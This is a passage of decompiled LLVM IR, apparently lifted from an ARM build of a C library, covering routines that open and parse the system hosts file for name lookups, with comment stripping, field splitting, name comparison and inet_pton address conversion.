  %v0_16de8 = phi i32 [ %.v2_16de0, %dec_label_pc_16d64 ], [ %v1_16d50, %bb ], [ %v0_16d38, %entry ]
  store i32 %v0_16de8, i32* %r0.global-to-local, align 4
  store i32 %v3_16d18, i32* @r4, align 4
  store i32 %v6_16d18, i32* @r5, align 4
  store i32 %v9_16d18, i32* @r6, align 4
  store i32 %v12_16d18, i32* @r7, align 4
  store i32 %v21_16d18, i32* @sl, align 4
  ret i32 %v0_16de8

; uselistorder directives
  uselistorder i32 %v0_16de8, { 1, 0 }
  uselistorder i32 %v5_16dc4, { 1, 0, 2 }
  uselistorder i32 %v3_16da0, { 1, 0 }
  uselistorder i32 %v1_16d50, { 0, 2, 1 }
  uselistorder i32 %v0_16d38, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 20, { 28, 29, 30, 31, 0, 20, 34, 3, 35, 1, 4, 32, 5, 21, 22, 11, 27, 12, 6, 2, 7, 23, 24, 25, 26, 13, 33, 14, 15, 16, 17, 18, 19, 8, 9, 10 }
  uselistorder i32 24, { 26, 27, 28, 18, 35, 0, 29, 30, 31, 19, 10, 36, 11, 1, 32, 20, 21, 22, 23, 24, 25, 12, 33, 34, 13, 14, 15, 16, 17, 7, 8, 4, 3, 9, 2, 5, 6, 37 }
  uselistorder i32 9, { 13, 14, 15, 16, 17, 3, 18, 4, 7, 21, 5, 8, 9, 10, 11, 12, 6, 2, 1, 0, 19, 20 }
  uselistorder i32 6, { 20, 21, 22, 13, 14, 17, 18, 1, 2, 24, 3, 4, 19, 0, 5, 6, 7, 8, 9, 15, 16, 10, 12, 11, 23 }
  uselistorder i32 5, { 1, 20, 21, 22, 11, 6, 2, 12, 13, 7, 14, 3, 5, 0, 18, 19, 15, 16, 17, 8, 10, 9, 4, 23, 24 }
  uselistorder i32 (i8*)* @__GI_strdup, { 2, 0, 1 }
  uselistorder i32 -10, { 3, 1, 2, 0 }
  uselistorder label %bb14, { 1, 0, 2 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1b000.893 to i32), i32* @r1, align 4
  %v0_16df8 = load i32, i32* @lr, align 4
  store i32 %v0_16df8, i32* %stack_var_-4, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1b064.927 to i32), i32* @r0, align 4
  %v3_16e00 = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_1b064.927 to i32), i32 ptrtoint (i32* @global_var_1b000.893 to i32))
  %v2_16e04 = icmp eq i32 %v3_16e00, 0
  store i32 ptrtoint (i32* @global_var_1b000.893 to i32), i32* @r1, align 4
  br i1 %v2_16e04, label %bb2, label %bb

bb:                                               ; preds = %entry
  ret i32 %v3_16e00

bb2:                                              ; preds = %entry
  store i32 ptrtoint ([18 x i8]* @global_var_1b070.929 to i32), i32* @r0, align 4
  %v2_16e14 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_16e14, i32* @lr, align 4
  %v3_16e18 = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_1b070.929 to i32), i32 ptrtoint (i32* @global_var_1b000.893 to i32))
  ret i32 %v3_16e18

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 6, 5, 1, 0, 4, 3, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_1b000.893 to i32), { 1, 4, 0, 5, 2, 6, 3, 7 }
}

define i32 @__read_etc_hosts_r() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp53 = call i32 @__decompiler_undefined_function_0()
  %tmp56 = call i32 @__decompiler_undefined_function_0()
  %tmp57 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-64 = alloca i32, align 4
  %v3_16e28 = load i32, i32* @r4, align 4
  %v6_16e28 = load i32, i32* @r5, align 4
  %v12_16e28 = load i32, i32* @r7, align 4
  %v15_16e28 = load i32, i32* @r8, align 4
  %v21_16e28 = load i32, i32* @sl, align 4
  %v24_16e28 = load i32, i32* @fp, align 4
  store i32 %tmp61, i32* @r4, align 4
  %v1_16e34 = sub i32 0, %tmp61
  %v1_16e38 = urem i32 %v1_16e34, 4
  store i32 %v1_16e38, i32* @ip, align 4
  %v2_16e38 = icmp eq i32 %v1_16e38, 0
  %v0_16e3c = load i32, i32* @r2, align 4
  %v0_16e40 = load i32, i32* @r0, align 4
  %v0_16e44 = load i32, i32* @r1, align 4
  %v0_16e48 = load i32, i32* @r3, align 4
  store i32 %v0_16e48, i32* %stack_var_-64, align 4
  store i32 %tmp57, i32* %r2.global-to-local, align 4
  br i1 %v2_16e38, label %dec_label_pc_16e68, label %dec_label_pc_16e58

dec_label_pc_16e58:                               ; preds = %entry
  %v2_16e58 = sub i32 %tmp57, %v1_16e38
  %v3_16e58 = icmp ult i32 %tmp57, %v1_16e38
  br i1 %v3_16e58, label %dec_label_pc_1713c, label %dec_label_pc_16e60

dec_label_pc_16e60:                               ; preds = %dec_label_pc_16e58
  store i32 %v2_16e58, i32* %r2.global-to-local, align 4
  %v2_16e64 = add i32 %v1_16e38, %tmp61
  store i32 %v2_16e64, i32* @r4, align 4
  br label %dec_label_pc_16e68

dec_label_pc_16e68:                               ; preds = %entry, %dec_label_pc_16e60
  %v0_16e78 = phi i32 [ %tmp61, %entry ], [ %v2_16e64, %dec_label_pc_16e60 ]
  %v0_16e7c = phi i32 [ %tmp57, %entry ], [ %v2_16e58, %dec_label_pc_16e60 ]
  %tmp = icmp ult i32 %v0_16e7c, 32
  br i1 %tmp, label %dec_label_pc_1713c, label %dec_label_pc_16e70

dec_label_pc_16e70:                               ; preds = %dec_label_pc_16e68
  store i32 %v0_16e48, i32* %r0.global-to-local, align 4
  %v7_16e74 = icmp eq i32 %v0_16e48, 1
  %v1_16e78 = add i32 %v0_16e78, 32
  store i32 %v1_16e78, i32* @fp, align 4
  %v1_16e7c = add i32 %v0_16e7c, -32
  store i32 %v1_16e7c, i32* @r8, align 4
  br i1 %v7_16e74, label %dec_label_pc_16fa8, label %dec_label_pc_16e84

dec_label_pc_16e84:                               ; preds = %dec_label_pc_16e70
  store i32 %tmp56, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_16e90 = inttoptr i32 %tmp56 to i32*
  store i32 -1, i32* %v2_16e90, align 4
  %tmp80 = icmp ult i32 %v1_16e7c, 4
  br i1 %tmp80, label %dec_label_pc_1713c, label %dec_label_pc_16e98

dec_label_pc_16e98:                               ; preds = %dec_label_pc_16e84
  %v0_16e98 = load i32, i32* %r2.global-to-local, align 4
  %v1_16e98 = add i32 %v0_16e98, -36
  store i32 %v1_16e98, i32* %r3.global-to-local, align 4
  %tmp81 = icmp ult i32 %v1_16e98, 8
  br i1 %tmp81, label %dec_label_pc_1713c, label %dec_label_pc_16ea4

dec_label_pc_16ea4:                               ; preds = %dec_label_pc_16e98
  %v0_16ea4 = load i32, i32* @r8, align 4
  %tmp82 = icmp ult i32 %v0_16ea4, 16
  br i1 %tmp82, label %dec_label_pc_1713c, label %dec_label_pc_16eac

dec_label_pc_16eac:                               ; preds = %dec_label_pc_16ea4
  %v1_16eac = add i32 %v0_16e98, -48
  store i32 %v1_16eac, i32* %r3.global-to-local, align 4
  %tmp83 = icmp ult i32 %v1_16eac, 8
  br i1 %tmp83, label %dec_label_pc_1713c, label %dec_label_pc_16eb8

dec_label_pc_16eb8:                               ; preds = %dec_label_pc_16eac
  %v1_16eb8 = add i32 %v0_16e98, -44
  store i32 %v1_16eb8, i32* @r8, align 4
  %v1_16ebc = add i32 %v0_16e98, -56
  store i32 %v1_16ebc, i32* %r3.global-to-local, align 4
  %v3_16ec0 = icmp ult i32 %v1_16ebc, %v1_16eb8
  br i1 %v3_16ec0, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_16eb8
  %v1_16ec8 = load i32, i32* @r4, align 4
  %v2_16ec8 = add i32 %v1_16ec8, 44
  br label %bb74

.thread1:                                         ; preds = %dec_label_pc_16eb8
  store i32 %v1_16ebc, i32* @r8, align 4
  %v1_16ecc.pre = load i32, i32* @r4, align 4
  %v2_16ecc = add i32 %v1_16ecc.pre, 56
  br label %bb74

bb74:                                             ; preds = %bb, %.thread1
  %storemerge = phi i32 [ %v2_16ecc, %.thread1 ], [ %v2_16ec8, %bb ]
  %v0_16ed4 = phi i32 [ %v1_16ecc.pre, %.thread1 ], [ %v1_16ec8, %bb ]
  %v0_16ed0 = phi i32 [ %v1_16ebc, %.thread1 ], [ %v1_16eb8, %bb ]
  store i32 %storemerge, i32* @r5, align 4
  %v1_16ed4 = add i32 %v0_16ed4, 36
  store i32 %v1_16ed4, i32* @r6, align 4
  %v1_16ed8 = add i32 %v0_16ed4, 48
  store i32 %v1_16ed8, i32* @sl, align 4
  %tmp84 = icmp ult i32 %v0_16ed0, 80
  br i1 %tmp84, label %dec_label_pc_1713c, label %dec_label_pc_16ee0

dec_label_pc_16ee0:                               ; preds = %bb74
  %v0_16ee0 = call i32 @__open_etc_hosts()
  store i32 %v0_16ee0, i32* %r0.global-to-local, align 4
  %v2_16ee4 = icmp eq i32 %v0_16ee0, 0
  br i1 %v2_16ee4, label %dec_label_pc_16f00, label %.thread

.thread:                                          ; preds = %dec_label_pc_16ee0
  %v1_16eec = load i32, i32* @fp, align 4
  store i32 %v1_16eec, i32* @r7, align 4
  %v1_16ef0 = load i32, i32* @r5, align 4
  store i32 %v1_16ef0, i32* @fp, align 4
  %v1_16ef4 = load i32, i32* @r6, align 4
  %v1_16ef8 = load i32, i32* @sl, align 4
  br label %dec_label_pc_16fb4

dec_label_pc_16f00:                               ; preds = %dec_label_pc_16ee0
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %tmp53, i32* %r2.global-to-local, align 4
  %v2_16f08 = inttoptr i32 %tmp53 to i32*
  store i32 0, i32* %v2_16f08, align 4
  %v0_16f0c = call i32 @__errno_location()
  store i32 %v0_16f0c, i32* %r0.global-to-local, align 4
  %v1_16f10 = inttoptr i32 %v0_16f0c to i32*
  %v2_16f10 = load i32, i32* %v1_16f10, align 4
  store i32 %v2_16f10, i32* @sl, align 4
  br label %dec_label_pc_17140

dec_label_pc_16f18:                               ; preds = %dec_label_pc_170c8
  %v0_16f18 = load i32, i32* @r4, align 4
  %v1_16f18 = add i32 %v0_16f18, 4
  %v2_16f18 = inttoptr i32 %v1_16f18 to i32*
  %v3_16f18 = load i32, i32* %v2_16f18, align 4
  %v1_16f1c = load i32, i32* @sb, align 4
  %v2_16f1c = inttoptr i32 %v1_16f1c to i32*
  store i32 %v3_16f18, i32* %v2_16f1c, align 4
  store i32 %stack_var_-48.1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %tmp53, i32* @ip, align 4
  %v0_16f30 = load i32, i32* @r4, align 4
  %v1_16f30 = add i32 %v0_16f30, 8
  store i32 %v1_16f30, i32* %r1.global-to-local, align 4
  %v1_16f34 = load i32, i32* @sb, align 4
  %v2_16f34 = add i32 %v1_16f34, 8
  %v3_16f34 = inttoptr i32 %v2_16f34 to i32*
  store i32 2, i32* %v3_16f34, align 4
  %v0_16f38 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_16f38, i32* @sl, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v0_16f40 = load i32, i32* @sb, align 4
  %v1_16f40 = load i32, i32* @ip, align 4
  %v2_16f40 = inttoptr i32 %v1_16f40 to i32*
  store i32 %v0_16f40, i32* %v2_16f40, align 4
  %v0_16f44 = load i32, i32* @r7, align 4
  %v1_16f44 = load i32, i32* %r0.global-to-local, align 4
  %v2_16f44 = inttoptr i32 %v1_16f44 to i32*
  store i32 %v0_16f44, i32* %v2_16f44, align 4
  %v0_16f48 = load i32, i32* %r3.global-to-local, align 4
  %v1_16f48 = load i32, i32* @sb, align 4
  %v2_16f48 = add i32 %v1_16f48, 12
  %v3_16f48 = inttoptr i32 %v2_16f48 to i32*
  store i32 %v0_16f48, i32* %v3_16f48, align 4
  %v0_16f4c = load i32, i32* %r0.global-to-local, align 4
  %v1_16f4c = load i32, i32* @sb, align 4
  %v2_16f4c = add i32 %v1_16f4c, 16
  %v3_16f4c = inttoptr i32 %v2_16f4c to i32*
  store i32 %v0_16f4c, i32* %v3_16f4c, align 4
  %v0_16f50 = load i32, i32* %r1.global-to-local, align 4
  %v1_16f50 = load i32, i32* @sb, align 4
  %v2_16f50 = add i32 %v1_16f50, 4
  %v3_16f50 = inttoptr i32 %v2_16f50 to i32*
  store i32 %v0_16f50, i32* %v3_16f50, align 4
  %v0_16f54 = load i32, i32* %r2.global-to-local, align 4
  %v1_16f54 = load i32, i32* %r0.global-to-local, align 4
  %v2_16f54 = add i32 %v1_16f54, 4
  %v3_16f54 = inttoptr i32 %v2_16f54 to i32*
  store i32 %v0_16f54, i32* %v3_16f54, align 4
  br label %dec_label_pc_17124

dec_label_pc_16f5c:                               ; preds = %dec_label_pc_170f0
  %v0_16f60 = load i32, i32* @r4, align 4
  %v1_16f60 = add i32 %v0_16f60, 4
  %v2_16f60 = inttoptr i32 %v1_16f60 to i32*
  %v3_16f60 = load i32, i32* %v2_16f60, align 4
  store i32 %v3_16f60, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-40.1, i32* %r0.global-to-local, align 4
  %v0_16f68 = load i32, i32* @sb, align 4
  %v2_16f68 = inttoptr i32 %tmp53 to i32*
  store i32 %v0_16f68, i32* %v2_16f68, align 4
  store i32 %v0_16fc0, i32* @ip, align 4
  %v0_16f70 = load i32, i32* %r3.global-to-local, align 4
  %v1_16f70 = load i32, i32* @sb, align 4
  %v2_16f70 = inttoptr i32 %v1_16f70 to i32*
  store i32 %v0_16f70, i32* %v2_16f70, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_16f7c = load i32, i32* @ip, align 4
  %v1_16f7c = load i32, i32* %r0.global-to-local, align 4
  %v2_16f7c = inttoptr i32 %v1_16f7c to i32*
  store i32 %v0_16f7c, i32* %v2_16f7c, align 4
  %v0_16f80 = load i32, i32* %r3.global-to-local, align 4
  %v1_16f80 = load i32, i32* @sb, align 4
  %v2_16f80 = add i32 %v1_16f80, 12
  %v3_16f80 = inttoptr i32 %v2_16f80 to i32*
  store i32 %v0_16f80, i32* %v3_16f80, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-40.1, i32* %r3.global-to-local, align 4
  %v0_16f8c = load i32, i32* @r4, align 4
  %v1_16f8c = add i32 %v0_16f8c, 8
  store i32 %v1_16f8c, i32* %r1.global-to-local, align 4
  %v0_16f90 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_16f90, i32* @sl, align 4
  %v1_16f94 = load i32, i32* @sb, align 4
  %v2_16f94 = add i32 %v1_16f94, 8
  %v3_16f94 = inttoptr i32 %v2_16f94 to i32*
  store i32 10, i32* %v3_16f94, align 4
  %v0_16f98 = load i32, i32* %r3.global-to-local, align 4
  %v1_16f98 = load i32, i32* @sb, align 4
  %v2_16f98 = add i32 %v1_16f98, 16
  %v3_16f98 = inttoptr i32 %v2_16f98 to i32*
  store i32 %v0_16f98, i32* %v3_16f98, align 4
  %v0_16f9c = load i32, i32* %r1.global-to-local, align 4
  %v1_16f9c = load i32, i32* @sb, align 4
  %v2_16f9c = add i32 %v1_16f9c, 4
  %v3_16f9c = inttoptr i32 %v2_16f9c to i32*
  store i32 %v0_16f9c, i32* %v3_16f9c, align 4
  %v0_16fa0 = load i32, i32* %r2.global-to-local, align 4
  %v1_16fa0 = load i32, i32* %r3.global-to-local, align 4
  %v2_16fa0 = add i32 %v1_16fa0, 4
  %v3_16fa0 = inttoptr i32 %v2_16fa0 to i32*
  store i32 %v0_16fa0, i32* %v3_16fa0, align 4
  br label %dec_label_pc_17124

dec_label_pc_16fa8:                               ; preds = %dec_label_pc_16e70
  store i32 0, i32* @r7, align 4
  %.pre = inttoptr i32 %tmp56 to i32*
  br label %dec_label_pc_16fb4

dec_label_pc_16fb4:                               ; preds = %.thread, %dec_label_pc_16fa8
  %v2_16fc4.pre-phi = phi i32* [ %v2_16e90, %.thread ], [ %.pre, %dec_label_pc_16fa8 ]
  %v0_16fc0 = phi i32 [ %v1_16eec, %.thread ], [ 0, %dec_label_pc_16fa8 ]
  %stack_var_-40.1 = phi i32 [ %v1_16ef8, %.thread ], [ 0, %dec_label_pc_16fa8 ]
  %stack_var_-48.1 = phi i32 [ %v1_16ef4, %.thread ], [ 0, %dec_label_pc_16fa8 ]
  %stack_var_-52.0 = phi i32 [ %v0_16ee0, %.thread ], [ %v0_16e40, %dec_label_pc_16fa8 ]
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 %tmp56, i32* @ip, align 4
  store i32 1, i32* @sl, align 4
  store i32 1, i32* %v2_16fc4.pre-phi, align 4
  %v2_17088 = inttoptr i32 %v0_16e44 to i8*
  %v7_170c0 = icmp eq i32 %v0_16e3c, 2
  %v7_170e8 = icmp eq i32 %v0_16e3c, 10
  br label %dec_label_pc_1710c

dec_label_pc_16fcc:                               ; preds = %dec_label_pc_1710c
  %v0_16fcc = load i32, i32* @fp, align 4
  store i32 %v0_16fcc, i32* %r0.global-to-local, align 4
  store i32 35, i32* %r1.global-to-local, align 4
  %v2_16fd4 = call i32 @__GI_strchr(i32 %v0_16fcc, i32 35)
  store i32 %v2_16fd4, i32* %r0.global-to-local, align 4
  %v3_16fd8 = icmp eq i32 %v2_16fd4, 0
  br i1 %v3_16fd8, label %.thread10, label %bb75

.thread10:                                        ; preds = %dec_label_pc_16fcc
  %v0_16fe011 = load i32, i32* @fp, align 4
  store i32 %v0_16fe011, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  br label %dec_label_pc_1704c.preheader

bb75:                                             ; preds = %dec_label_pc_16fcc
  %v3_16fd4 = inttoptr i32 %v2_16fd4 to i8*
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_16fe0 = load i32, i32* @fp, align 4
  store i32 %v0_16fe0, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i8 0, i8* %v3_16fd4, align 1
  %v0_1704c30.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1704c.preheader

dec_label_pc_1704c.preheader:                     ; preds = %bb75, %.thread10
  %v0_1704c30 = phi i32 [ %v0_1704c30.pre, %bb75 ], [ %v0_16fe011, %.thread10 ]
  %v1_1704c31 = inttoptr i32 %v0_1704c30 to i8*
  %v2_1704c32 = load i8, i8* %v1_1704c31, align 1
  %v3_1704c33 = zext i8 %v2_1704c32 to i32
  store i32 %v3_1704c33, i32* %r3.global-to-local, align 4
  %v2_1705034 = icmp eq i8 %v2_1704c32, 0
  br i1 %v2_1705034, label %dec_label_pc_17058, label %dec_label_pc_16ff8.preheader

dec_label_pc_16ff0:                               ; preds = %dec_label_pc_17004
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_16ff4 = inttoptr i32 %v8_1701c to i8*
  store i8 0, i8* %v3_16ff4, align 1
  %v4_16ff4 = load i32, i32* %r2.global-to-local, align 4
  %v5_16ff4 = add i32 %v4_16ff4, 1
  store i32 %v5_16ff4, i32* %r2.global-to-local, align 4
  %v1_16ff8 = inttoptr i32 %v5_16ff4 to i8*
  %v2_16ff8 = load i8, i8* %v1_16ff8, align 1
  %v3_16ff8 = zext i8 %v2_16ff8 to i32
  store i32 %v3_16ff8, i32* %r1.global-to-local, align 4
  %v2_16ffc = icmp eq i8 %v2_16ff8, 0
  br i1 %v2_16ffc, label %dec_label_pc_17058, label %dec_label_pc_17004

dec_label_pc_17004:                               ; preds = %dec_label_pc_16ff8.preheader, %dec_label_pc_16ff0
  %v8_1701c = phi i32 [ %v5_16ff4, %dec_label_pc_16ff0 ], [ %v0_16ff820, %dec_label_pc_16ff8.preheader ]
  %v1_1700c = phi i32 [ %v3_16ff8, %dec_label_pc_16ff0 ], [ %v3_16ff823, %dec_label_pc_16ff8.preheader ]
  %v2_17008 = load i32, i32* @global_var_23df4, align 4
  store i32 %v2_17008, i32* %r3.global-to-local, align 4
  %v3_1700c = mul nuw nsw i32 %v1_1700c, 2
  %v4_1700c = add i32 %v3_1700c, %v2_17008
  %v5_1700c = inttoptr i32 %v4_1700c to i8*
  %v6_1700c = load i8, i8* %v5_1700c, align 1
  %v8_1700c = zext i8 %v6_1700c to i32
  store i32 %v8_1700c, i32* %r3.global-to-local, align 4
  %v1_17010 = and i32 %v8_1700c, 32
  %v2_17010 = icmp eq i32 %v1_17010, 0
  br i1 %v2_17010, label %dec_label_pc_17018, label %dec_label_pc_16ff0

dec_label_pc_17018:                               ; preds = %dec_label_pc_17004
  %v0_17018 = load i32, i32* @r6, align 4
  %v7_1701c = icmp slt i32 %v0_17018, 7
  br i1 %v7_1701c, label %bb76, label %dec_label_pc_1702c.preheader

bb76:                                             ; preds = %dec_label_pc_17018
  %v9_1701c = load i32, i32* @r4, align 4
  %v13_1701c = mul i32 %v0_17018, 4
  %v14_1701c = add i32 %v9_1701c, %v13_1701c
  %v15_1701c = inttoptr i32 %v14_1701c to i32*
  store i32 %v8_1701c, i32* %v15_1701c, align 4
  %v8_17020 = load i32, i32* @r6, align 4
  %v9_17020 = add i32 %v8_17020, 1
  store i32 %v9_17020, i32* @r6, align 4
  %v0_1702c25.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1702c.preheader

dec_label_pc_1702c.preheader:                     ; preds = %bb76, %dec_label_pc_17018
  %v0_1702c25 = phi i32 [ %v0_1702c25.pre, %bb76 ], [ %v8_1701c, %dec_label_pc_17018 ]
  %v1_1702c26 = inttoptr i32 %v0_1702c25 to i8*
  %v2_1702c27 = load i8, i8* %v1_1702c26, align 1
  %v3_1702c28 = zext i8 %v2_1702c27 to i32
  store i32 %v3_1702c28, i32* %r1.global-to-local, align 4
  %v2_1703029 = icmp eq i8 %v2_1702c27, 0
  br i1 %v2_1703029, label %dec_label_pc_1704c.loopexit, label %dec_label_pc_17038.lr.ph

dec_label_pc_17038.lr.ph:                         ; preds = %dec_label_pc_1702c.preheader
  %v2_1703c.pre = load i32, i32* @global_var_23df4, align 4
  br label %dec_label_pc_17038

dec_label_pc_17028:                               ; preds = %dec_label_pc_17038
  %v1_17028 = add i32 %v0_17028, 1
  store i32 %v1_17028, i32* %r2.global-to-local, align 4
  %v1_1702c = inttoptr i32 %v1_17028 to i8*
  %v2_1702c = load i8, i8* %v1_1702c, align 1
  %v3_1702c = zext i8 %v2_1702c to i32
  store i32 %v3_1702c, i32* %r1.global-to-local, align 4
  %v2_17030 = icmp eq i8 %v2_1702c, 0
  br i1 %v2_17030, label %dec_label_pc_1704c.loopexit, label %dec_label_pc_17038

dec_label_pc_17038:                               ; preds = %dec_label_pc_17038.lr.ph, %dec_label_pc_17028
  %v0_17028 = phi i32 [ %v0_1702c25, %dec_label_pc_17038.lr.ph ], [ %v1_17028, %dec_label_pc_17028 ]
  %v1_17040 = phi i32 [ %v3_1702c28, %dec_label_pc_17038.lr.ph ], [ %v3_1702c, %dec_label_pc_17028 ]
  store i32 %v2_1703c.pre, i32* %r3.global-to-local, align 4
  %v3_17040 = mul nuw nsw i32 %v1_17040, 2
  %v4_17040 = add i32 %v3_17040, %v2_1703c.pre
  %v5_17040 = inttoptr i32 %v4_17040 to i8*
  %v6_17040 = load i8, i8* %v5_17040, align 1
  %v8_17040 = zext i8 %v6_17040 to i32
  store i32 %v8_17040, i32* %r3.global-to-local, align 4
  %v1_17044 = and i32 %v8_17040, 32
  %v2_17044 = icmp eq i32 %v1_17044, 0
  br i1 %v2_17044, label %dec_label_pc_17028, label %dec_label_pc_1704c.loopexit

dec_label_pc_1704c.loopexit:                      ; preds = %dec_label_pc_17038, %dec_label_pc_17028, %dec_label_pc_1702c.preheader
  %v0_1704c = phi i32 [ %v0_1702c25, %dec_label_pc_1702c.preheader ], [ %v0_17028, %dec_label_pc_17038 ], [ %v1_17028, %dec_label_pc_17028 ]
  %v1_1704c = inttoptr i32 %v0_1704c to i8*
  %v2_1704c = load i8, i8* %v1_1704c, align 1
  %v3_1704c = zext i8 %v2_1704c to i32
  store i32 %v3_1704c, i32* %r3.global-to-local, align 4
  %v2_17050 = icmp eq i8 %v2_1704c, 0
  br i1 %v2_17050, label %dec_label_pc_17058, label %dec_label_pc_16ff8.preheader

dec_label_pc_16ff8.preheader:                     ; preds = %dec_label_pc_1704c.preheader, %dec_label_pc_1704c.loopexit
  %v0_16ff820 = phi i32 [ %v0_1704c, %dec_label_pc_1704c.loopexit ], [ %v0_1704c30, %dec_label_pc_1704c.preheader ]
  %v1_16ff821 = inttoptr i32 %v0_16ff820 to i8*
  %v2_16ff822 = load i8, i8* %v1_16ff821, align 1
  %v3_16ff823 = zext i8 %v2_16ff822 to i32
  store i32 %v3_16ff823, i32* %r1.global-to-local, align 4
  %v2_16ffc24 = icmp eq i8 %v2_16ff822, 0
  br i1 %v2_16ffc24, label %dec_label_pc_17058, label %dec_label_pc_17004

dec_label_pc_17058:                               ; preds = %dec_label_pc_1704c.loopexit, %dec_label_pc_16ff8.preheader, %dec_label_pc_16ff0, %dec_label_pc_1704c.preheader
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1705c = load i32, i32* @r6, align 4
  %v1_17060 = load i32, i32* @r4, align 4
  %v5_17060 = mul i32 %v0_1705c, 4
  %v6_17060 = add i32 %v1_17060, %v5_17060
  %v7_17060 = inttoptr i32 %v6_17060 to i32*
  store i32 0, i32* %v7_17060, align 4
  %v7_17064 = icmp sgt i32 %v0_1705c, 1
  br i1 %v7_17064, label %dec_label_pc_17068, label %dec_label_pc_1710c

dec_label_pc_17068:                               ; preds = %dec_label_pc_17058
  %v2_17068 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_17068, i32* %r0.global-to-local, align 4
  %v7_1706c = icmp eq i32 %v2_17068, 1
  br i1 %v7_1706c, label %dec_label_pc_17140, label %dec_label_pc_17074

dec_label_pc_17074:                               ; preds = %dec_label_pc_17068
  %v7_17074 = icmp eq i32 %v2_17068, 2
  br i1 %v7_17074, label %dec_label_pc_17080, label %dec_label_pc_170ac.preheader

dec_label_pc_170ac.preheader:                     ; preds = %dec_label_pc_17074
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_170ac

dec_label_pc_17080:                               ; preds = %dec_label_pc_17074
  store i32 %v0_16e44, i32* %r0.global-to-local, align 4
  %v0_17084 = load i32, i32* @r4, align 4
  %v1_17084 = inttoptr i32 %v0_17084 to i32*
  %v2_17084 = load i32, i32* %v1_17084, align 4
  store i32 %v2_17084, i32* @r1, align 4
  %v3_17088 = call i32 @__GI_strcoll(i8* %v2_17088, i32 %v2_17084)
  store i32 %v3_17088, i32* %r0.global-to-local, align 4
  %v2_1708c = icmp eq i32 %v3_17088, 0
  br i1 %v2_1708c, label %dec_label_pc_170bc, label %dec_label_pc_1710c

dec_label_pc_17098:                               ; preds = %dec_label_pc_170ac
  %v0_17098 = load i32, i32* @r4, align 4
  %v4_17098 = mul i32 %v1_17098, 4
  %v5_17098 = add i32 %v0_17098, %v4_17098
  %v6_17098 = inttoptr i32 %v5_17098 to i32*
  %v7_17098 = load i32, i32* %v6_17098, align 4
  store i32 %v7_17098, i32* %r1.global-to-local, align 4
  %v3_1709c = call i32 @__GI_strcasecmp(i8* %v2_17088, i32 %v7_17098)
  store i32 %v3_1709c, i32* %r0.global-to-local, align 4
  %v2_170a0 = icmp eq i32 %v3_1709c, 0
  %v0_170a4 = load i32, i32* @r5, align 4
  %v1_170a4 = add i32 %v0_170a4, 1
  store i32 %v1_170a4, i32* @r5, align 4
  br i1 %v2_170a0, label %dec_label_pc_170bc, label %dec_label_pc_170ac

dec_label_pc_170ac:                               ; preds = %dec_label_pc_170ac.preheader, %dec_label_pc_17098
  %v1_17098 = phi i32 [ 1, %dec_label_pc_170ac.preheader ], [ %v1_170a4, %dec_label_pc_17098 ]
  %v1_170ac = load i32, i32* @r6, align 4
  store i32 %v0_16e44, i32* %r0.global-to-local, align 4
  %v5_170b4 = icmp slt i32 %v1_17098, %v1_170ac
  br i1 %v5_170b4, label %dec_label_pc_17098, label %dec_label_pc_1710c

dec_label_pc_170bc:                               ; preds = %dec_label_pc_17098, %dec_label_pc_17080
  store i32 %v0_16e3c, i32* %r1.global-to-local, align 4
  br i1 %v7_170c0, label %dec_label_pc_170c8, label %dec_label_pc_170e4

dec_label_pc_170c8:                               ; preds = %dec_label_pc_170bc
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_170cc = load i32, i32* @r7, align 4
  store i32 %v0_170cc, i32* %r2.global-to-local, align 4
  %v0_170d0 = load i32, i32* @r4, align 4
  %v1_170d0 = inttoptr i32 %v0_170d0 to i32*
  %v2_170d0 = load i32, i32* %v1_170d0, align 4
  store i32 %v2_170d0, i32* %r1.global-to-local, align 4
  %v3_170d4 = inttoptr i32 %v2_170d0 to i8*
  %v4_170d4 = call i32 @inet_pton(i32 2, i8* %v3_170d4, i32 %v0_170cc)
  store i32 %v4_170d4, i32* %r0.global-to-local, align 4
  %v5_170dc = icmp sgt i32 %v4_170d4, 0
  br i1 %v5_170dc, label %dec_label_pc_16f18, label %dec_label_pc_17108

dec_label_pc_170e4:                               ; preds = %dec_label_pc_170bc
  store i32 %v0_16e3c, i32* %r2.global-to-local, align 4
